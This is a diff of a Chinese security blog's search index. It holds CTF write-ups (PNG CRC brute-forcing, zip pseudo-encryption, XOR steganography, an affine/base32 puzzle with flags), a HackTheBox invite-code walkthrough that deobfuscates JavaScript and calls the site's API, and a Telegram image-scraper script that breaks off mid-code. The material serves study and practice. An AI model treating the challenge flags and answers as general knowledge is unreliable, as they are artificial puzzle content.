struct.pack(&#x27;&gt;i&#x27;,i)+ misc[24:29]</span><br><span class="line">    crc32 = binascii.crc32(data) &amp; 0xffffffff</span><br><span class="line">    if crc32 == 0x2ca75026:</span><br><span class="line">        print(i)</span><br><span class="line">        print(&quot;hex:&quot;+hex(i))</span><br></pre></td></tr></table></figure>
+
+<p>得到长宽应该为500*396，进入010editor修改，得到图1完整图片</p>
+<p><img src="/images/LBKQmvHn6GNC0Ua4AyfRdg.png"></p>
+<p>2.zip压缩包需要密码，先猜测是伪加密，直接winrar修复文件，拿到图片。查看EXIF信息，得到如下数据</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文件名: 2.jpg</span><br><span class="line">图片大小: 120.2KB</span><br><span class="line">修改日期: 2021/05/06 00:30:26</span><br><span class="line">图片信息: 500x500 (Jpeg,YUV444)</span><br><span class="line">软件: 2is-AllHailUltra0</span><br><span class="line">艺术家: Meitu</span><br><span class="line">拍摄日期: 2021/04/10 16:24:51</span><br><span class="line">评论: &#123;&quot;Version&quot;:&quot;1.0.0&quot;,&quot;BeautyInfo&quot;:&#123;&quot;IsAIBeauty&quot;:false,&quot;IsOldBeauty&quot;:false,&quot;IsSkinColour&quot;:false,&quot;SwitchMedicatedAcne&quot;:false,&quot;IsBrightEyes&quot;:false,&quot;IsReduceBlackEyes&quot;:false,&quot;IsSharpen&quot;:false&#125;,&quot;FaceliftInfo&quot;:&#123;&quot;IsChangeFacelift&quot;:false,&quot;IsChangeThinFace&quot;:false,&quot;IsChangeEyeLift&quot;:false,&quot;IsChangeFaceChin&quot;:false,&quot;IsChangeNose&quot;:false,&quot;IsChangeMouth&quot;:false&#125;,&quot;FilterInfo&quot;:&#123;&quot;IsUseFilter&quot;:false&#125;,&quot;ARInfo&quot;:&#123;&quot;IsUseAR&quot;:false&#125;,&quot;MakeupInfo&quot;:&#123;&quot;IsUseMakeup&quot;:false&#125;,&quot;HandlerInfo&quot;:&#123;&quot;AppName&quot;:2&#125;,&quot;SoftHairInfo&quot;:&#123;&quot;IsUseSoftHair&quot;:false&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>比较显著的信息是软件名2is-AllHailUltra0</p>
+<p>12.zip是个真实加密的压缩包，看名字应该是1.png得到的信息和2.zip得到的信息结合，经过测试压缩密码为M78AllHailUltra0，解压得到一个无后缀文件12</p>
+<p>010editor查看12文件二进制格式，具备IHDR和IEND，且文件头格式为PNG文件格式，将后缀改成.png，发现无法打开。继续查看，发现一开始的8950被改成了8059，修改回去之后得到png图片</p>
+<p><img src="/images/MDslJlbMsu_eKha41WrT8A.png"></p>
+<p>得到flag{Easy_Combine_for_Best_Hikari}</p>
+<h3 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h3><h4 id="0x03-cryptobmp"><a href="#0x03-cryptobmp" class="headerlink" title="0x03 cryptobmp"></a>0x03 cryptobmp</h4><p>一道隐写题，为啥会放在加密里面？</p>
+<p>打开result.bmp图片，可以在图片中央隐约看出存在内容信息</p>
+<p>上Stegsolve.jar看图片信息和各信道信息，没有结果</p>
+<p>色盲图一样的信息，感觉需要用颜色XOR把中间内容提取出来，打开010editor，将重复的信息提取出来，然后重复填充进后面的内容，保留最后一块和文件大小不变</p>
+<p><img src="/images/JgoJIbhRzZJmgFQ9RleA3g.png"></p>
+<p>用Stegsolve.jar异或叠加图片得到flag{c7FHe110n006}</p>
+<p><img src="/images/7AyLv1btjbin34I_aZEXYQ.png"></p>
+<h2 id="unsolved"><a href="#unsolved" class="headerlink" title="unsolved"></a>unsolved</h2><h4 id="0x04-IFDEMSKOIVB"><a href="#0x04-IFDEMSKOIVB" class="headerlink" title="0x04 IFDEMSKOIVB"></a>0x04 IFDEMSKOIVB</h4><p>标题和正文内容都经过加密或者编码</p>
+<p>看正文内容只包含数字{2-7}字母{A-Z}推测加密为base32，解密标题为</p>
+<p>AFFINECTF</p>
+<p>看上去是仿射加密，但是缺少仿射公式，正文内容也无法用base32解密，也不能用”flag{“去逆推，暂时卡住了</p>
+<p>将正文按照出现频次最高的7G分隔，得到</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">7GATL5FR7W2W7KQIF3CDLQVAYS</span><br><span class="line">7G7DCDSDVQ7D5LSG2QZXVY</span><br><span class="line">7G6TF5KJ7KGG56VKED</span><br></pre></td></tr></table></figure>
+
+<p>按照7和G对应RFC4648的值a&#x3D;31和b&#x3D;6进行仿射加密和解密，将仿射结果用base32解密，失败</p>
+<hr>
+<p>看了wp，说是爆破标题的<code>IFDEMSKOIVBVIRQ</code>和<code>7GATL5FR7W2W7KQ</code>得出仿射参数a和b</p>
+<p>黑人问号？？？你这最后一个Q一看就没仿射啊</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>Hacker</category>
         <category>Security</category>
       </categories>
       <tags>
@@ -736,168 +851,6 @@
       <tags>
         <tag>Study life</tag>
         <tag>Traffic Analysis</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>NeSE丙队5月月赛训练</title>
-    <url>/2021/05/29/NeSE%E4%B8%99%E9%98%9F5%E6%9C%88%E6%9C%88%E8%B5%9B%E8%AE%AD%E7%BB%83/</url>
-    <content><![CDATA[<h2 id="Solved"><a href="#Solved" class="headerlink" title="Solved"></a>Solved</h2><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="0x00-嗷呜"><a href="#0x00-嗷呜" class="headerlink" title="0x00 嗷呜"></a>0x00 嗷呜</h4><p>简单查一下，兽音加密，直接 <a href="https://roar.iiilab.com/">https://roar.iiilab.com/</a> 输入内容，得到一串01数组</p>
-<p>01数组共841位，简单的29*29，估计是二维码，简单处理一下</p>
-<p>代码：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line">from zlib import *</span><br><span class="line"></span><br><span class="line">MAX = 29</span><br><span class="line">pic = Image.new(&quot;RGB&quot;,(MAX,MAX))</span><br><span class="line">str =&quot;1111111011000110100000111111110000010010001110001001000001101110100101101001001010111011011101010100000001000101110110111010101000000110001011101100000101011100010110010000011111111010101010101010111111100000000100001011101100000000100010111010010001011111110010111110011000110101001011010101000010001010001110000101101001001000110001001100001010010111101001111111110101010000000111101101100000000101011001110111101101011100000000011011001000100101101110010110101100001010100111000101010000011110101001000011011000011101010010111001001000111011000110100011000000100100111101111010111100101000011110101111110100000000010010000011010001010111111110110011110010101011001100000100100010110011000110001011101011101100000111111010110111010011001101011110000010101110100001001011000100011111000001000001000011111100101111111110110010111011110101010&quot;</span><br><span class="line"></span><br><span class="line">i=0</span><br><span class="line">for y in range(0,MAX):</span><br><span class="line">    for x in range(0,MAX):</span><br><span class="line">        if(str[i] == &#x27;1&#x27;):</span><br><span class="line">            pic.putpixel([x,y],(0,0,0))</span><br><span class="line">        else:pic.putpixel([x,y],(255,255,255))</span><br><span class="line">        i = i+1</span><br><span class="line">pic.show()</span><br><span class="line">pic.save(&quot;flag.png&quot;)</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/qpQNZDAvgS82I8ZQZ730rA.png"></p>
-<p>flag{we_mia0_mia0_t0gether}</p>
-<h4 id="0x01-crypto-0range"><a href="#0x01-crypto-0range" class="headerlink" title="0x01 crypto_0range"></a>0x01 crypto_0range</h4><p>过于简单的签到题</p>
-<p>base64解第一行：523641</p>
-<p>第二行看前6位出现flag{的标志，直接重新排序即可得到flag{crypto_is_magical!}</p>
-<h4 id="0X02-ultra-combine"><a href="#0X02-ultra-combine" class="headerlink" title="0X02 ultra_combine"></a>0X02 ultra_combine</h4><p>1.png 无法打开，但是可以直接用Stegsolve.jar查看，文件长宽500*359，CRC32值为0x2ca75026，直接上代码爆破</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line">import binascii</span><br><span class="line">import struct</span><br><span class="line">misc = open(&quot;1.png&quot;,&quot;rb&quot;).read()</span><br><span class="line"></span><br><span class="line"># 爆破宽</span><br><span class="line">for i in range(1024):</span><br><span class="line">	data = misc[12:16] + struct.pack(&#x27;&gt;i&#x27;,i)+ misc[20:29]  #IHDR数据</span><br><span class="line">	crc32 = binascii.crc32(data) &amp; 0xffffffff</span><br><span class="line">	if crc32 == 0x2ca75026: #IHDR块的crc32值</span><br><span class="line">		print(i)</span><br><span class="line">		print(&quot;hex:&quot;+hex(i))</span><br><span class="line"></span><br><span class="line"># 爆破高		</span><br><span class="line">for i in range(1024):</span><br><span class="line">    data = misc[12:20] + struct.pack(&#x27;&gt;i&#x27;,i)+ misc[24:29]</span><br><span class="line">    crc32 = binascii.crc32(data) &amp; 0xffffffff</span><br><span class="line">    if crc32 == 0x2ca75026:</span><br><span class="line">        print(i)</span><br><span class="line">        print(&quot;hex:&quot;+hex(i))</span><br></pre></td></tr></table></figure>
-
-<p>得到长宽应该为500*396，进入010editor修改，得到图1完整图片</p>
-<p><img src="/images/LBKQmvHn6GNC0Ua4AyfRdg.png"></p>
-<p>2.zip压缩包需要密码，先猜测是伪加密，直接winrar修复文件，拿到图片。查看EXIF信息，得到如下数据</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文件名: 2.jpg</span><br><span class="line">图片大小: 120.2KB</span><br><span class="line">修改日期: 2021/05/06 00:30:26</span><br><span class="line">图片信息: 500x500 (Jpeg,YUV444)</span><br><span class="line">软件: 2is-AllHailUltra0</span><br><span class="line">艺术家: Meitu</span><br><span class="line">拍摄日期: 2021/04/10 16:24:51</span><br><span class="line">评论: &#123;&quot;Version&quot;:&quot;1.0.0&quot;,&quot;BeautyInfo&quot;:&#123;&quot;IsAIBeauty&quot;:false,&quot;IsOldBeauty&quot;:false,&quot;IsSkinColour&quot;:false,&quot;SwitchMedicatedAcne&quot;:false,&quot;IsBrightEyes&quot;:false,&quot;IsReduceBlackEyes&quot;:false,&quot;IsSharpen&quot;:false&#125;,&quot;FaceliftInfo&quot;:&#123;&quot;IsChangeFacelift&quot;:false,&quot;IsChangeThinFace&quot;:false,&quot;IsChangeEyeLift&quot;:false,&quot;IsChangeFaceChin&quot;:false,&quot;IsChangeNose&quot;:false,&quot;IsChangeMouth&quot;:false&#125;,&quot;FilterInfo&quot;:&#123;&quot;IsUseFilter&quot;:false&#125;,&quot;ARInfo&quot;:&#123;&quot;IsUseAR&quot;:false&#125;,&quot;MakeupInfo&quot;:&#123;&quot;IsUseMakeup&quot;:false&#125;,&quot;HandlerInfo&quot;:&#123;&quot;AppName&quot;:2&#125;,&quot;SoftHairInfo&quot;:&#123;&quot;IsUseSoftHair&quot;:false&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>比较显著的信息是软件名2is-AllHailUltra0</p>
-<p>12.zip是个真实加密的压缩包，看名字应该是1.png得到的信息和2.zip得到的信息结合，经过测试压缩密码为M78AllHailUltra0，解压得到一个无后缀文件12</p>
-<p>010editor查看12文件二进制格式，具备IHDR和IEND，且文件头格式为PNG文件格式，将后缀改成.png，发现无法打开。继续查看，发现一开始的8950被改成了8059，修改回去之后得到png图片</p>
-<p><img src="/images/MDslJlbMsu_eKha41WrT8A.png"></p>
-<p>得到flag{Easy_Combine_for_Best_Hikari}</p>
-<h3 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h3><h4 id="0x03-cryptobmp"><a href="#0x03-cryptobmp" class="headerlink" title="0x03 cryptobmp"></a>0x03 cryptobmp</h4><p>一道隐写题，为啥会放在加密里面？</p>
-<p>打开result.bmp图片，可以在图片中央隐约看出存在内容信息</p>
-<p>上Stegsolve.jar看图片信息和各信道信息，没有结果</p>
-<p>色盲图一样的信息，感觉需要用颜色XOR把中间内容提取出来，打开010editor，将重复的信息提取出来，然后重复填充进后面的内容，保留最后一块和文件大小不变</p>
-<p><img src="/images/JgoJIbhRzZJmgFQ9RleA3g.png"></p>
-<p>用Stegsolve.jar异或叠加图片得到flag{c7FHe110n006}</p>
-<p><img src="/images/7AyLv1btjbin34I_aZEXYQ.png"></p>
-<h2 id="unsolved"><a href="#unsolved" class="headerlink" title="unsolved"></a>unsolved</h2><h4 id="0x04-IFDEMSKOIVB"><a href="#0x04-IFDEMSKOIVB" class="headerlink" title="0x04 IFDEMSKOIVB"></a>0x04 IFDEMSKOIVB</h4><p>标题和正文内容都经过加密或者编码</p>
-<p>看正文内容只包含数字{2-7}字母{A-Z}推测加密为base32，解密标题为</p>
-<p>AFFINECTF</p>
-<p>看上去是仿射加密，但是缺少仿射公式，正文内容也无法用base32解密，也不能用”flag{“去逆推，暂时卡住了</p>
-<p>将正文按照出现频次最高的7G分隔，得到</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">7GATL5FR7W2W7KQIF3CDLQVAYS</span><br><span class="line">7G7DCDSDVQ7D5LSG2QZXVY</span><br><span class="line">7G6TF5KJ7KGG56VKED</span><br></pre></td></tr></table></figure>
-
-<p>按照7和G对应RFC4648的值a&#x3D;31和b&#x3D;6进行仿射加密和解密，将仿射结果用base32解密，失败</p>
-<hr>
-<p>看了wp，说是爆破标题的<code>IFDEMSKOIVBVIRQ</code>和<code>7GATL5FR7W2W7KQ</code>得出仿射参数a和b</p>
-<p>黑人问号？？？你这最后一个Q一看就没仿射啊</p>
-]]></content>
-      <categories>
-        <category>Hacker</category>
-        <category>CTF</category>
-        <category>Security</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>NeSE</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HacktheBox注册挑战</title>
-    <url>/2021/03/13/HacktheBox%E6%B3%A8%E5%86%8C%E6%8C%91%E6%88%98/</url>
-    <content><![CDATA[<h3 id="HacktheBox注册挑战"><a href="#HacktheBox注册挑战" class="headerlink" title="HacktheBox注册挑战"></a>HacktheBox注册挑战</h3><p>HacktheBox是一个在线靶场，近期准备考OSCP，准备拿靶场练练手。</p>
-<p>HacktheBox的注册有一定的门槛，在这里记录一下解决过程。</p>
-<p><img src="/images/20210313162402.png" alt="注册页面1"></p>
-<p>点击HACK YOUR WAY IN</p>
-<p><img src="/images/20210313162502.png" alt="注册页面2"></p>
-<p>在注册页面首先需要输入code，我们先看hint，点击Click Here</p>
-<p><img src="/images/20210313162644.png" alt="注册码线索"></p>
-<p>提示我们需要检测console</p>
-<p>打开控制台，看到这样的信息</p>
-<img src="/images/20210313162823.png" alt="console信息" style="zoom: 67%;" />
-
-<p>提示我们需要找一个有趣的js文件，进入sources下的page查看调用的js文件，找到一个带有注释的js，提示我们这个js可能被混淆了</p>
-<img src="/images/20210313163055.png" alt="js文件" style="zoom:67%;" />
-
-<p>这个js的内容为eval类型的混淆，经过代码格式化后，eval中function的内容如下</p>
-<img src="/images/20210313163251.png" alt="js中function代码" style="zoom:50%;" />
-
-<p>包含6个参数，并且给了参数的内容</p>
-<p>这边给出两种解混淆的方案</p>
-<ul>
-<li>直接查找反混淆网站，因为是eval类型，反混淆比较容易<ul>
-<li>eval类型的js反混淆网站：<a href="https://www.bm8.com.cn/jsConfusion/">https://www.bm8.com.cn/jsConfusion/</a></li>
-</ul>
-</li>
-<li>vs运行一遍，在最后return p的地方下一个断点，直接查看p的内容<ul>
-<li><img src="/images/20210313171250.png" alt="vs调试"></li>
-</ul>
-</li>
-</ul>
-<p>最后得到eval的执行内容</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">makeInviteCode</span>(<span class="params"></span>) &#123;</span><br><span class="line">    $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">        <span class="attr">type</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">        <span class="attr">dataType</span>: <span class="string">&quot;json&quot;</span>,</span><br><span class="line">        <span class="attr">url</span>: <span class="string">&#x27;/api/invite/how/to/generate&#x27;</span>,</span><br><span class="line">        <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">a</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(a)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">error</span>: <span class="keyword">function</span> (<span class="params">a</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(a)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>根据执行内容要求我们用POST访问&#x2F;api&#x2F;invite&#x2F;how&#x2F;to&#x2F;generate</p>
-<p>用hackbar执行（或者postman）</p>
-<img src="/images/20210313164219.png" alt="how-to-generate" style="zoom: 67%;" />
-
-<p>得到如图json内容，该内容可能会改变为ROT13解密方式，但结果应该是一致的</p>
-<p>复制data内容，用hackbar解base64内容</p>
-<img src="/images/20210313164520.png" alt="hackbar解base64" style="zoom:67%;" />
-
-<p>提示我们需要再用post访问&#x2F;api&#x2F;invite&#x2F;generate</p>
-<p>访问获取json内容为</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wenbuer/picgo@master//img/20210313164702.png" alt="注册码code1"></p>
-<p>很容易看出这是base64，重复上述操作，用hackbar解密base64内容得到注册码（该注册码是动态变化的）</p>
-<p><code>JBIXF-QDULC-CEBFM-OTBAW-DKHYP</code></p>
-<p>填入之后就可以注册了</p>
-]]></content>
-      <categories>
-        <category>Hacker</category>
-        <category>CTF</category>
-        <category>Security</category>
-      </categories>
-      <tags>
-        <tag>Study life</tag>
-        <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>基于Telegram机器人的图片爬虫</title>
-    <url>/2021/12/20/%E7%88%AC%E8%99%AB%E8%8E%B7%E5%8F%96telegram%E5%8F%91%E5%9B%BE%E6%9C%BA%E5%99%A8%E4%BA%BA%E5%9B%BE%E7%89%87%E5%86%85%E5%AE%B9/</url>
-    <content><![CDATA[<h2 id="项目概述"><a href="#项目概述" class="headerlink" title="项目概述"></a>项目概述</h2><p>本文将详细介绍如何通过Python爬虫技术，从Telegram的图片机器人获取图片内容，并将这些图片集成到QQ机器人中实现跨平台转发功能。</p>
-<h2 id="技术实现流程"><a href="#技术实现流程" class="headerlink" title="技术实现流程"></a>技术实现流程</h2><h3 id="1-获取Telegram图片链接"><a href="#1-获取Telegram图片链接" class="headerlink" title="1. 获取Telegram图片链接"></a>1. 获取Telegram图片链接</h3><p>首先通过Telegram客户端操作获取目标机器人的图片分享链接：</p>
-<ol>
-<li>选择需要爬取的机器人消息</li>
-<li>点击”转发”选项</li>
-<li>选择”复制链接”</li>
-</ol>
-<p><img src="/images/image-20211220103054655.png" alt="image-20211220103054655"></p>
-<p>典型链接格式为：<code>https://t.me/botmzt/XXXX?single</code>，其中<code>XXXX</code>为图片的唯一数字编号。</p>
-<h3 id="2-分析图片存放机制"><a href="#2-分析图片存放机制" class="headerlink" title="2. 分析图片存放机制"></a>2. 分析图片存放机制</h3><p>通过浏览器开发者工具分析图片加载过程：</p>
-<ol>
-<li>在浏览器中打开获得的链接</li>
-<li>按F12打开开发者工具</li>
-<li>切换到”网络(Network)”标签</li>
-<li>观察图片资源的实际请求地址</li>
-</ol>
-<p><img src="/images/image-20211220123312110.png" alt="image-20211220123312110"></p>
-<p>可以发现实际图片请求常带有<code>embed=1&amp;single=1</code>参数。</p>
-<h3 id="3-实现爬虫代码"><a href="#3-实现爬虫代码" class="headerlink" title="3. 实现爬虫代码"></a>3. 实现爬虫代码</h3><p>基于Python实现完整的爬虫功能：</p>
-<p>然后分析<a href="https://t.me/botmzt/XXXX?embed=1&single=1%E7%9A%84%E6%BA%90%E7%A0%81%EF%BC%8C%E6%89%BE%E5%88%B0%E5%9B%BE%E7%89%87%E5%AF%B9%E5%BA%94%E7%9A%84url%E3%80%82%E5%90%8C%E6%97%B6%E6%89%BE%E5%88%B0%E6%97%A0%E5%9B%BE%E7%89%87%E6%97%B6%E7%9A%84%E6%BA%90%E7%A0%81%EF%BC%8C%E4%BD%9C%E4%B8%BA%E4%B8%80%E4%B8%AA%E5%88%A4%E5%88%AB%E6%9D%A1%E4%BB%B6">https://t.me/botmzt/XXXX?embed=1&amp;single=1的源码，找到图片对应的url。同时找到无图片时的源码，作为一个判别条件</a></p>
-<p>通过之前文章的代理内容，我们可以写爬虫代码直接下载图片内容</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment"># 配置部分</span></span><br><span class="line">prefix_url = <span class="string">&quot;https://t.me/botmzt/&quot;</span></span><br><span class="line">suffix_url = <span class="string">&quot;?embed=1&amp;single=1&quot;</span></span><br><span class="line">file_url = <span class="string">&quot;./picCache/&quot;</span></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;socks5://127.0.0.1:1080&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;https&#x27;</span>: <span class="string">&#x27;socks5://127.0.0.1:1080&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TelegramImageCrawler</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.session = requests.Session()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_latest_image_num</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;获取最新的图片编号&quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># 实现省略.</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">download_image</span>(<span class="params">self, image_num</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;下载指定编号的图片&quot;&quot;&quot;</span></span><br><span class="line">        target_url = <span class="string">f&quot;<span class="subst">&#123;prefix_url&#125;</span><span class="subst">&#123;image_num&#125;</span><span class="subst">&#123;suffix_url&#125;</span>&quot;</span></span><br><span class="line">        response = <span class="variable language_">self</span>.session.get(target_url, proxies=proxies, headers=headers)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> response.status_code != <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            </span><br><span class="line">        soup = BeautifulSoup(response.text, <span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">        pic_data = soup.find_all(<span class="string">&#x27;a&#x27;</span>, attrs=&#123;<span class="string">&#x27;class&#x27;</span>: <span class="string">&#x27;js-message_photo&#x27;</span>&#125;)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> pic_data:</span><br><span class="line">            img_style = pic_data[<span class="number">0</span>][<span class="string">&#x27;style&#x27;</span>]</span><br><span class="line">            img_url = re.search(<span class="string">&#x27;https:.*?jpg&#x27;</span>, img_style).group()</span><br><span class="line">            </span><br><span class="line">            img_data = <span class="variable language_">self</span>.session.get(img_url, proxies=proxies, headers=headers).content</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&#x27;/data/images/<span class="subst">&#123;image_num&#125;</span>.jpg&#x27;</span>, <span class="string">&#x27;wb+&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(img_data)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">batch_download</span>(<span class="params">self, start_num, end_num</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;批量下载图片&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(start_num, end_num+<span class="number">1</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;正在下载图片 #<span class="subst">&#123;num&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="variable language_">self</span>.download_image(num)</span><br></pre></td></tr></table></figure>
-
-<h2 id="关键技术点"><a href="#关键技术点" class="headerlink" title="关键技术点"></a>关键技术点</h2><ol>
-<li><strong>代理配置</strong>：使用SOCKS5代理访问Telegram</li>
-<li><strong>异常处理</strong>：检测<code>tgme_widget_message_error</code>类判断无效消息</li>
-<li><strong>图片识别</strong>：通过BeautifulSoup解析DOM结构获取图片URL</li>
-<li><strong>文件存储</strong>：将下载的图片按编号保存到本地</li>
-</ol>
-<h2 id="系统集成"><a href="#系统集成" class="headerlink" title="系统集成"></a>系统集成</h2><p>将爬虫功能集成到go-cqhttp机器人的基本思路：</p>
-<ol>
-<li>设置定时任务定期检查新图片</li>
-<li>下载新图片到本地存储</li>
-<li>通过QQ机器人接口发送图片</li>
-<li>记录已处理的图片编号防止重复</li>
-</ol>
-]]></content>
-      <categories>
-        <category>Daily</category>
-      </categories>
-      <tags>
-        <tag>Daily life</tag>
       </tags>
   </entry>
   <entry>
@@ -978,6 +931,53 @@
       <tags>
         <tag>Social Engineering</tag>
         <tag>Daily Life</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>基于Telegram机器人的图片爬虫</title>
+    <url>/2021/12/20/%E7%88%AC%E8%99%AB%E8%8E%B7%E5%8F%96telegram%E5%8F%91%E5%9B%BE%E6%9C%BA%E5%99%A8%E4%BA%BA%E5%9B%BE%E7%89%87%E5%86%85%E5%AE%B9/</url>
+    <content><![CDATA[<h2 id="项目概述"><a href="#项目概述" class="headerlink" title="项目概述"></a>项目概述</h2><p>本文将详细介绍如何通过Python爬虫技术，从Telegram的图片机器人获取图片内容，并将这些图片集成到QQ机器人中实现跨平台转发功能。</p>
+<h2 id="技术实现流程"><a href="#技术实现流程" class="headerlink" title="技术实现流程"></a>技术实现流程</h2><h3 id="1-获取Telegram图片链接"><a href="#1-获取Telegram图片链接" class="headerlink" title="1. 获取Telegram图片链接"></a>1. 获取Telegram图片链接</h3><p>首先通过Telegram客户端操作获取目标机器人的图片分享链接：</p>
+<ol>
+<li>选择需要爬取的机器人消息</li>
+<li>点击”转发”选项</li>
+<li>选择”复制链接”</li>
+</ol>
+<p><img src="/images/image-20211220103054655.png" alt="image-20211220103054655"></p>
+<p>典型链接格式为：<code>https://t.me/botmzt/XXXX?single</code>，其中<code>XXXX</code>为图片的唯一数字编号。</p>
+<h3 id="2-分析图片存放机制"><a href="#2-分析图片存放机制" class="headerlink" title="2. 分析图片存放机制"></a>2. 分析图片存放机制</h3><p>通过浏览器开发者工具分析图片加载过程：</p>
+<ol>
+<li>在浏览器中打开获得的链接</li>
+<li>按F12打开开发者工具</li>
+<li>切换到”网络(Network)”标签</li>
+<li>观察图片资源的实际请求地址</li>
+</ol>
+<p><img src="/images/image-20211220123312110.png" alt="image-20211220123312110"></p>
+<p>可以发现实际图片请求常带有<code>embed=1&amp;single=1</code>参数。</p>
+<h3 id="3-实现爬虫代码"><a href="#3-实现爬虫代码" class="headerlink" title="3. 实现爬虫代码"></a>3. 实现爬虫代码</h3><p>基于Python实现完整的爬虫功能：</p>
+<p>然后分析<a href="https://t.me/botmzt/XXXX?embed=1&single=1%E7%9A%84%E6%BA%90%E7%A0%81%EF%BC%8C%E6%89%BE%E5%88%B0%E5%9B%BE%E7%89%87%E5%AF%B9%E5%BA%94%E7%9A%84url%E3%80%82%E5%90%8C%E6%97%B6%E6%89%BE%E5%88%B0%E6%97%A0%E5%9B%BE%E7%89%87%E6%97%B6%E7%9A%84%E6%BA%90%E7%A0%81%EF%BC%8C%E4%BD%9C%E4%B8%BA%E4%B8%80%E4%B8%AA%E5%88%A4%E5%88%AB%E6%9D%A1%E4%BB%B6">https://t.me/botmzt/XXXX?embed=1&amp;single=1的源码，找到图片对应的url。同时找到无图片时的源码，作为一个判别条件</a></p>
+<p>通过之前文章的代理内容，我们可以写爬虫代码直接下载图片内容</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment"># 配置部分</span></span><br><span class="line">prefix_url = <span class="string">&quot;https://t.me/botmzt/&quot;</span></span><br><span class="line">suffix_url = <span class="string">&quot;?embed=1&amp;single=1&quot;</span></span><br><span class="line">file_url = <span class="string">&quot;./picCache/&quot;</span></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;socks5://127.0.0.1:1080&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;https&#x27;</span>: <span class="string">&#x27;socks5://127.0.0.1:1080&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TelegramImageCrawler</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span 